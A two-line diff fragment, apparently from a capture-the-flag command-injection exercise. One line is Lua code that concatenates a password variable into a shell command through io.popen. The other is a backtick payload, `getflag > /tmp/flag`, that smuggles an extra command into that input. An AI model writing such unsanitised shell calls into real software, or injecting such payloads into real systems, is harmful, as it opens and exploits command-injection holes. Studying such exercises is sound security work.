@@ -1,0 +1,2 @@
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+`getflag > /tmp/flag`
